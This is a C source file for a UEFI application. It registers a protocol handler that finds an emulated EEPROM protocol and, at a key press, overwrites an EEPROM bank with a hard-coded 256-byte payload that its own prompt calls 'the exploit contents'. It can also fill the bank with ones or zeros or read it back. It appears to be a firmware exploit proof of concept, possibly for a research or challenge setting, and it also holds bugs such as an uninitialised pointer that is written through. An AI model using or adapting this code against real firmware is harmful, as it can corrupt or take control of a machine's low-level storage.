#include <Uefi.h>
#include <Library/PcdLib.h>
#include <Library/UefiLib.h>
#include <Library/DebugLib.h>
#include <Library/UefiApplicationEntryPoint.h>
#include <Library/UefiBootServicesTableLib.h>

typedef struct {
    EFI_STATUS (*function1)(void*, UINT8, UINT8*, unsigned long long);
} MyInterface2;

MyInterface2 myInstance2;


#define EFI_EMULATED_EEPROM_GUID {0x82b244dc, 0x8503, 0x454b, {0xa9, 0x6a, 0xd0, 0xd2, 0xe0, 0x0b, 0xf8, 0x6a}};

typedef EFI_STATUS (EFIAPI *EEPROMREAD)(void*, long long, unsigned long long, UINT8*);
typedef EFI_STATUS (EFIAPI *EEPROMWRITE)(void*, long long, unsigned long long, UINT8*);

typedef struct _EFI_EEPROM_PROTOCOL {
    EEPROMREAD eepromRead;
    EEPROMWRITE eepromWrite;
} EFI_EEPROM_PROTOCOL;

EFI_STATUS BOProt(void* this, UINT8 data, UINT8* size, unsigned long long offset){
    Print(L"\n");
    Print(L"Hello World Inside BOProt.\n");
    EFI_EEPROM_PROTOCOL *mEmulatedEepromProtocol; 


    // INT64 **EmulatedEepromDxeProt;
    EFI_GUID gEmulatedEepromDxe = EFI_EMULATED_EEPROM_GUID;
    EFI_STATUS stat = gBS->LocateProtocol(&gEmulatedEepromDxe, (void *)0x0, (void**)&mEmulatedEepromProtocol);
    Print(L"Status of LocateProtocol: %d\n", stat);
    if (stat != EFI_SUCCESS) {
        Print(L"Failed to locate EmulatedEepromDxe Protocol!\n");
        return EFI_SUCCESS;
    }

    stat = mEmulatedEepromProtocol->eepromRead((void**)&mEmulatedEepromProtocol, (long long) 0x5c,(unsigned long long)0, (UINT8)0);

    Print(L"Ret Status of read: %d\n", stat);

    UINT8 inData[0x100] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8b, 0xc5, 0x04, 0x41, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0xa2, 0xce, 0x46, 0x8e, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd9, 0x75, 0x86, 0xe4, 0x00, 0x00, 0xd1, 0xf0, 0x88, 0xf7, 0x11, 0xea, 0xa6, 0xaa, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xd9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

     //clear screen
    // gST->ConOut->ClearScreen(gST->ConOut);
    while(1){
      EFI_INPUT_KEY my_input;
      EFI_STATUS readStatus;
      UINTN Index;
      Print(L"Press '2' for writing the exploit contents, press '1' for writing all ones, press '0' for writing all zeroes, press 'r' for reading from memory and press anything else to abort.\n");
      gBS->WaitForEvent(1, &gST->ConIn->WaitForKey, &Index);
          readStatus = gST->ConIn->ReadKeyStroke (gST->ConIn, &my_input);
        if (EFI_ERROR(readStatus)) {
          gST->ConOut->OutputString(gST->ConOut, L"ReadKeyStroke error.\n");
          return readStatus;
        }
      Print(L"Status: %d, Scan code: %c\n", readStatus, my_input.UnicodeChar);

      UINT8* pRes; 

    //if the pressed number is 2, then write the input data from the exploit 
      if (my_input.UnicodeChar == 0x32){
        Print(L"Pressed 2\n");

        unsigned long long ctr;
     
        long long unk_enum = 0x57; 

        for (ctr = 0; ctr < 0x100; ctr+=1)
        {
            *pRes = inData[ctr];
            EFI_STATUS status = mEmulatedEepromProtocol->eepromWrite((void**)&mEmulatedEepromProtocol, (long long) unk_enum,(unsigned long long)ctr, (UINT8*)pRes);

          Print(L"Ret Status of write: %d\n", status);
        }
      }

      //if the pressed number is 1, then write all ones 
      else if (my_input.UnicodeChar == 0x31){
        Print(L"Pressed 1\n");
        *pRes = 255;

        unsigned long long ctr;
     
        long long unk_enum = 0x57; 

        for (ctr = 0; ctr < 0x100; ctr+=1)
        {
          // pRes += 1;
            EFI_STATUS status = mEmulatedEepromProtocol->eepromWrite((void**)&mEmulatedEepromProtocol, (long long) unk_enum,(unsigned long long)ctr, (UINT8*)pRes);

          Print(L"Ret Status of write: %d\n", status);
        }
      }
      //if 0 is pressed, write all 0
      else if (my_input.UnicodeChar == 0x30){
        Print(L"Pressed 0\n");
        *pRes = 0;
        unsigned long long ctr;
     
        long long unk_enum = 0x57; 

        for (ctr = 0; ctr < 0x100; ctr+=1)
        {
          // pRes += 1;
            EFI_STATUS status = mEmulatedEepromProtocol->eepromWrite((void**)&mEmulatedEepromProtocol, (long long) unk_enum,(unsigned long long)ctr, (UINT8*)pRes);
          Print(L"Ret Status of write: %d\n", status);
        }
      }
      //if r is pressed, read from memory
      else if (my_input.UnicodeChar == 0x72){
        Print(L"Reading from EC\n");

        Print(L"Input which bankno should be read\n");
        gBS->WaitForEvent(1, &gST->ConIn->WaitForKey, &Index);
        readStatus = gST->ConIn->ReadKeyStroke (gST->ConIn, &my_input);
        if (EFI_ERROR(readStatus)) {
          gST->ConOut->OutputString(gST->ConOut, L"ReadKeyStroke error.\n");
          return readStatus;
        }

        unsigned long long bankno;
        if(my_input.UnicodeChar == 0x30){
          bankno = 0x0;
        }
        else if (my_input.UnicodeChar == 0x31){
          bankno = 0x1;
        }
        else if (my_input.UnicodeChar == 0x32){
          bankno = 0x2;
        }
        else if (my_input.UnicodeChar == 0x33){
          bankno = 0x3;
        }
        else if (my_input.UnicodeChar == 0x34){
          bankno = 0x4;
        }
        else if (my_input.UnicodeChar == 0x35){
          bankno = 0x5;
        }
        else if (my_input.UnicodeChar == 0x36){
          bankno = 0x6;
        }
        else if (my_input.UnicodeChar == 0x37){
          bankno = 0x7;
        }
        else if (my_input.UnicodeChar == 0x38){
          bankno = 0x8;
        }
        else if (my_input.UnicodeChar == 0x39){
          bankno = 0x9;
        }
        else{
          Print(L"Error, press 0-8");
          break;
        }
        
        UINT8* buffer[8];
        // char* bufferstart = *buffer;
        // for (; bankno < 8; bankno+=1){
        EFI_STATUS status = mEmulatedEepromProtocol->eepromRead((void**)&mEmulatedEepromProtocol, (long long) 0x57,(unsigned long long)bankno, (UINT8*)buffer);
        Print(L"Status: %llu",status);
        if (status == EFI_SUCCESS){
          Print(L"Written in the buffer: %s\n", buffer);
        }
        // }
        Print(L"\n");

      }
      else {
        Print(L"Pressed %c, aborting.", my_input.UnicodeChar);
        break;
      }
      

    }

    return EFI_SUCCESS;
}
/**
  The user Entry Point for Application. The user code starts with this function
  as the real entry point for the application.

  @param[in] ImageHandle    The firmware allocated handle for the EFI image.
  @param[in] SystemTable    A pointer to the EFI System Table.

  @retval EFI_SUCCESS       The entry point is executed successfully.
  @retval other             Some error occurs when executing this entry point.

**/
EFI_STATUS
EFIAPI
UefiMain (
  IN EFI_HANDLE        ImageHandle,
  IN EFI_SYSTEM_TABLE  *SystemTable
  )
{

    EFI_BOOT_SERVICES *gBS = SystemTable->BootServices;

    EFI_GUID gBootOptionsProtocol = {0x5962af91, 0x4456, 0x419f, {0xa7, 0xb9, 0x1f, 0x4f, 0x89, 0x2a, 0xb0, 0xf6}};

    myInstance2.function1 = &BOProt;
    (*gBS->InstallProtocolInterface)((EFI_HANDLE *)&ImageHandle, (EFI_GUID *)&gBootOptionsProtocol, EFI_NATIVE_INTERFACE, (void*)&myInstance2.function1);

    return EFI_SUCCESS; 
}
